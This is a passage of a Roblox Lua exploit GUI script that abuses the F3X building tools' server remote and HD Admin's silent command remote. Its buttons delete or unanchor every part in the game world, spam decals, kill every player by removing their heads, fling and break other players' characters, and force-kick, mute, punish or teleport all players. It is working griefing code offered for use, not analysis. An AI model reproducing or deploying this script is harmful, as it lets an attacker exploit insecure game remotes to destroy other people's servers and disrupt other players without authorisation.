				}
				_(args)
			end
	
	
	
			local function setcollision(part, booleana)
				local args = {
					"SyncCollision",
					{
						{
							Part = part,
							CanCollide = booleana
						}
					}
				}
				_(args)
			end
	
			local function setanchor(part, boolean)
				local args = {
					"SyncAnchor",
					{
						{
							Part = part,
							Anchored = boolean
						}
					}
				}
				_(args)
			end
	
			local function createdecal(part, side)
				local args = {
					"CreateTextures",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal"
						}
					}
				}
				_(args)
			end
	
			local function setdecal(part, asset, side)
				local args = {
					"SyncTexture",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal",
							Texture = "rbxassetid://" .. asset
						}
					}
				}
				_(args)
			end
	
			function toptexturecreate(part)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture"
						}
					}
				}
	
				_(args)
			end
			function toptextureadd(part)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture",
							["Texture"] = "rbxassetid://106466393571180",
							["StudsPerTileV"] = 99,
							["StudsPerTileU"] = 99
						}
					}
				}
				_(args)
			end
	
			local position = CFrame.new(0, 1, 0)
			local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
			resize(base, Vector3.new(1000, 55, 1000), position)
			toptexturecreate(base)
			toptextureadd(base)
	
	
	
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local UserInputService = game:GetService("UserInputService")
	
			local speaker = Players.LocalPlayer
			local oldgrav = workspace.Gravity
			local swimming = false
			local gravReset = nil
			local swimbeat = nil
			local enabledOnce = false
	
			local function swimDied()
				workspace.Gravity = oldgrav
				swimming = false
				if gravReset then
					gravReset:Disconnect()
					gravReset = nil
				end
				if swimbeat then
					swimbeat:Disconnect()
					swimbeat = nil
				end
				local Humanoid = speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid")
				if Humanoid then
					local enums = Enum.HumanoidStateType:GetEnumItems()
					table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
					for _, v in pairs(enums) do
						Humanoid:SetStateEnabled(v, true)
					end
				end
	
				if speaker.Character then
					for _, part in pairs(speaker.Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = true
						end
					end
				end
			end
	
			local function enableSwimming()
				if speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
					oldgrav = workspace.Gravity
					workspace.Gravity = 0
	
					local Humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
					gravReset = Humanoid.Died:Connect(swimDied)
	
					local enums = Enum.HumanoidStateType:GetEnumItems()
					table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
					for _, v in pairs(enums) do
						Humanoid:SetStateEnabled(v, false)
					end
	
					Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, true)
					Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	
					swimbeat = RunService.Heartbeat:Connect(function()
						pcall(function()
							if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
								local rootPart = speaker.Character.HumanoidRootPart
								local moveDir = Humanoid.MoveDirection
								local speed = 50
	
								local velX = moveDir.X * speed
								local velZ = moveDir.Z * speed
								local velY = 0
	
								if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
									velY = speed
								elseif UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift) then
									velY = -speed
								end
	
								rootPart.AssemblyLinearVelocity = Vector3.new(velX, velY, velZ)
	
	
								for _, v in pairs(speaker.Character:GetDescendants()) do
									if v:IsA("BasePart") then
										v.CanCollide = false
									end
								end
							end
						end)
					end)
	
					swimming = true
				end
			end
	
			local function tryEnable()
				if enabledOnce then return end
				if speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
					enabledOnce = true
					enableSwimming()
				end
			end
	
	
			tryEnable()
	
	
			speaker.CharacterAdded:Connect(function()
				task.spawn(function()
					task.wait(1) 
					tryEnable()
				end)
			end)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Clear Terrain"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Clear Terrain"
		button.TextColor3 = whit
		button.TextWrapped = true
	
	
	
	
	
	
	
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Apoc Troll"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Apoc Troll"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local tool
	
	
			for _,v in ipairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
			if not tool then
				for _,v in ipairs(game.ReplicatedStorage:GetDescendants()) do
					if v.Name == "SyncAPI" then
						tool = v.Parent
						break
					end
				end
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
	
			local function invokeSync(args)
				return remote:InvokeServer(unpack(args))
			end
	
			local function MovePart(part, cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
						}
					}
				}
				invokeSync(args)
			end
	
			local function BreakJoints(part)
				local args = {
					[1] = "BreakJoints",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				invokeSync(args)
			end
	
			spawn(function()
				local headCF = CFrame.new(player.Character.Head.Position)
				wait()
	
				for _, other in ipairs(game.Players:GetPlayers()) do
					if other ~= player and other.Character and other.Character:FindFirstChild("Torso") then
						local offset = CFrame.new(
							math.random(0,50),
							0,
							math.random(0,50)
						)
						MovePart(other.Character.Torso, headCF * offset)
	
						if other.Character:FindFirstChild("HumanoidRootPart") then
							BreakJoints(other.Character.HumanoidRootPart)
						end
					end
				end
			end)
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Set Skybox"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Set Skybox"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";time 0 ;fogcolor black")
	
			local function findBuildingTools()
				local player = game:GetService("Players").LocalPlayer
	
				for _, item in ipairs(player.Character:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				for _, item in ipairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				return nil
			end
	
			local buildingTools = findBuildingTools()
			if not buildingTools then
				warn("btools not found")
				return
			end
	
			local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
			local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
			if not serverEndpoint then
				warn("btools not found")
				return
			end
	
			local skyInstance = workspace:FindFirstChild("Sky")
			if not skyInstance then
				print"ok"
			end
	
			local args = {
				"Remove",                
				{ skyInstance }           
			}
	
			local success, result
			if serverEndpoint:IsA("RemoteFunction") then
				success, result = pcall(function()
					return serverEndpoint:InvokeServer(unpack(args))
				end)
			else
	
				serverEndpoint:FireServer(unpack(args))
				success = true
			end
	
			if success then
	
				print"yay"
	
			end
	
			local skyboxID = game.CoreGui.CoolGui.Frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
			local Players = game:GetService("Players")
			local workspace = game:GetService("Workspace")
			local player = Players.LocalPlayer
	
			local function findTool()
				local char = player.Character or player.CharacterAdded:Wait()
	
				for _, v in ipairs(char:GetChildren()) do
					if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
						return v
					end
				end
	
				for _, v in ipairs(player.Backpack:GetChildren()) do
					if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
						return v
					end
				end
			end
	
			local tool = findTool()
			if not tool then return end
	
			local remote = tool.SyncAPI.ServerEndpoint
			local function call(a)
				return remote:InvokeServer(unpack(a))
			end
	
			-- i dont used the b2s sky function anymore, i used this instead
			local hack = workspace:FindFirstChild("Skybox")
			if hack then
				call({ "Remove", { hack } })
			end
	
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
			local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
			task.spawn(function()
				call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
			end)
	
			task.spawn(function()
				call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
			end)
	
			task.spawn(function()
				call({ "CreateMeshes", { { Part = sky } } })
			end)
	
			task.spawn(function()
				call({
					"SyncMesh",
					{{
						Part = sky,
						MeshId = "rbxassetid://111891702759441",
						TextureId = "rbxassetid://8408806737",
						Scale = Vector3.new(100999, 100999, 100999),
						VertexColor = Vector3.new(3.6, 3.6, 3.6)
					}}
				})
			end)
	
			task.spawn(function()
				call({ "SetLocked", { sky }, true })
			end)
	
			task.spawn(function()
				call({ "SetName", { sky }, "E" })
			end)
	
			task.spawn(function()
				call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
			end)
	
			task.spawn(function()
				call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
			end)
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Unanchor All"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Unanchor All"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local char = player.Character
			local backpack = player.Backpack
	
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
	
				return nil
			end
	
			-- get all info
	
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
	
			local function setanchor(part, boolean)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function unanchorall()
				for _, v in ipairs(workspace:GetDescendants()) do
					if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "Sky" then
						spawn(function()
							setanchor(v, false)
						end)
					end
				end
			end
	
			unanchorall()
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Decal Spam"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Decal Spam"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			decalID = frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text
			-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
			id = 8408806737
	
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			--craaa
			remote = tool.SyncAPI.ServerEndpoint
	
			function GetPartsFromSelection(Selection)
	
				local Parts = {}
	
	
				for _, Descendant in pairs(Selection:GetDescendants()) do
	
					if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
						Parts[#Parts + 1] = Descendant
	
					end
	
				end
	
	
				-- Return parts
	
				return Parts
	
			end
	
			local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
			function SpawnDecal(side)
				local shitass = {}
	
				for _, Part in pairs(getfuckedlol) do
					-- Create the change request for this part
	
					table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
				end;
	
	
				-- Send the change to the server
	
				remote:InvokeServer('CreateTextures', shitass);
			end
	
			function AddDecal(texture,side)
				local shitass = {}
	
				for _, Part in pairs(getfuckedlol) do
					-- Create the change request for this part
	
					table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
				end;
	
	
				-- Send the change to the server
	
				remote:InvokeServer('SyncTexture', shitass);
			end
	
			SpawnDecal(Enum.NormalId.Front)
			AddDecal(id,Enum.NormalId.Front)
	
			SpawnDecal(Enum.NormalId.Back)
			AddDecal(id,Enum.NormalId.Back)
	
			SpawnDecal(Enum.NormalId.Right)
			AddDecal(id,Enum.NormalId.Right)
	
			SpawnDecal(Enum.NormalId.Left)
			AddDecal(id,Enum.NormalId.Left)
	
			SpawnDecal(Enum.NormalId.Bottom)
			AddDecal(id,Enum.NormalId.Bottom)
	
			SpawnDecal(Enum.NormalId.Top)
			AddDecal(id,Enum.NormalId.Top)
	
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			--craaa
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
	
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = part
					},
					[3] = stringg
				}
	
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
	
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
			function Color(part,color)
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Color"] = color --[[Color3]],
							["UnionColoring"] = false
						}
					}
				}
				_(args)
			end
			function SpawnDecal(part,side)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal"
						}
					}
				}
	
				_(args)
			end
			function AddDecal(part,asset,side)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal",
							["Texture"] = "rbxassetid://".. asset
						}
					}
				}
				_(args)
			end
	
			function spam()
				for i,v in game.workspace:GetDescendants() do
					if v:IsA("BasePart") then
						spawn(function()
							SetTrans(v,math.random(0,0))
						end)
					end
				end 
			end
			spam()
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Force Teleport"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Force Teleport"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local placeID = frame.Settings.Page1["Place ID"].TextBox.Text
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";place all " .. placeID)
			RequestCommandSilent:InvokeServer(";forceplace all " .. placeID)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Clear Workspace"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Clear Workspace"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer
	
			local character = player.Character 
	
			local player = game.Players.LocalPlayer
			local char = player.Character
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";punish all")
			RequestCommand:InvokeServer(";unmusic")
	
			local backpack = player.Backpack
	
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
	
				return nil
			end
	
			-- get all info
	
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
	
			local function delete(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function deleteall()
				for _, v in ipairs(workspace:GetDescendants()) do
					if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "Sky" then
						spawn(function()
							delete(v)
						end)
					end
				end
			end
	
			deleteall()
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Kill All"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Kill All"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			--craaa
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
	
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = workspace.Part
					},
					[3] = stringg
				}
	
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
	
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
	
			function KillAll()
				for i,v in game.Players:GetPlayers() do
					spawn(function()
						SetLocked(v.Character.Head,false)
						DestroyPart(v.Character.Head)
					end)
				end
			end
			KillAll()
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Kick All"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Kick All"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";uncmdbar2 all")
			RequestCommandSilent:InvokeServer(";hideguis all")
			RequestCommandSilent:InvokeServer(";mute all")
			RequestCommandSilent:InvokeServer(";blur all")
			RequestCommandSilent:InvokeServer(";kick all")
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Create Baseplate"	
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Create Baseplate"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local player = game.Players.LocalPlayer
			local char = player.Character
			local backpack = player.Backpack
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				return nil
			end
	
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
	
			function _(args)
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function addlight(part, brightness)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight"
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function synclight(part, brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight",
							["Range"] = 60,
							["Color"] = Color3.new(1, 0, 0)
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function fire(part) 
	
				local argsCreate = {
					[1] = "CreateDecorations",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire"
						}
					}
				}
	
	
				local argsSync = {
					[1] = "SyncDecorate",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire",
							["Size"] = 30,
							["Heat"] = 9,
							["Color"] = Color3.fromRGB(255, 0, 0), 
							["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
						} 
					} 
				}
	
	
				_(argsCreate)
				_(argsSync)
			end
			function MovePart(part, cf)
				local args = {
					"SyncMove",
					{
						{
							Part = part,
							CFrame = cf
						}
					}
				}
				_(args)
			end
	
			local function resize(part, size, cf)
				local args = {
					"SyncResize",
					{
						{
							Part = part,
							CFrame = cf,
							Size = size
						}
					}
				}
				_(args)
			end
	
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
	
			local function mat(part, mate)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Material = mate
						}
					}
				}
				_(args)
			end
	
			local function transparency(part, trans)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Transparency = trans
						}
					}
				}
				_(args)
			end
	
			local function color(part, color)
				local args = {
					"SyncColor",
					{
						{
							Part = part,
							Color = color,
							UnionColoring = false
						}
					}
				}
				_(args)
			end
	
			local function syncmeshid(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							MeshId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
	
			local function makemesh(part)
				local args = {
					"CreateMeshes",
					{
						{
							Part = part
						}
					}
				}
				_(args)
			end
	
			local function syncmeshsize(part, vectora)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							Scale = vectora
						}
					}
				}
				_(args)
			end
	
			local function syncmeshtexture(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							TextureId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
	
			local function name(part, stringa)
				local args = {
					"SetName",
					{ part },
					stringa
				}
				_(args)
			end
	
			local function lock(part, boolean)
				local args = {
					"SetLocked",
					{ part },
					boolean
				}
				_(args)
			end
	
	
	
			local function setcollision(part, booleana)
				local args = {
					"SyncCollision",
					{
						{
							Part = part,
							CanCollide = booleana
						}
					}
				}
				_(args)
			end
	
			local function setanchor(part, boolean)
				local args = {
					"SyncAnchor",
					{
						{
							Part = part,
							Anchored = boolean
						}
					}
				}
				_(args)
			end
	
			local function createdecal(part, side)
				local args = {
					"CreateTextures",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal"
						}
					}
				}
				_(args)
			end
	
			local function setdecal(part, asset, side)
				local args = {
					"SyncTexture",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal",
